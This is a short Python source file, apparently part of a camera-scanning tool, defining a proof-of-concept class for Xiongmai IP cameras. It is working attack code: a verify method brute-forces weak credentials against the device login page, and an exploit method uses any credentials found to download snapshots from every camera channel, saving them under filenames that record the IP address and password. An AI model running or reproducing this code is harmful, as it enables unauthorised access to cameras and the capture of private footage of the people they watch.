import re
import requests

from loguru import logger

from .base import POCTemplate


class XioingmaiWeakPassword(POCTemplate):
    product_key = 'xiongmai'

    def verify(self, ip, port=80):
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    data = {'command': 'login', 'username': user, 'password': password}
                    r = requests.get(f"http://{ip}:{port}/Login.htm",
                                     headers=self.headers, data=data,
                                     verify=False, timeout=self.config.timeout)
                    if r.status_code == 200 and 'failed' not in r.text:
                        ch_num = 0
                        if channel := re.findall(r'g_channelNumber=(.*);', r.text):
                            ch_num = int(channel[0])
                        return ip, str(port), self.product, user, password, self.name, ch_num
                except Exception as e:
                    logger.debug(e)
        return None

    def exploit(self, results):
        ip, port, _, user, password, _, ch_num = results
        res = []
        for i in range(1, ch_num + 1):
            url = f"http://{ip}:{port}/webcapture.jpg?command=snap&channel={i}&user={user}&password={password}"
            res.append(self._snapshot(url, f"{ip}-{port}-{user}-{password}-channel_{i}.jpg"))
        return sum(res)
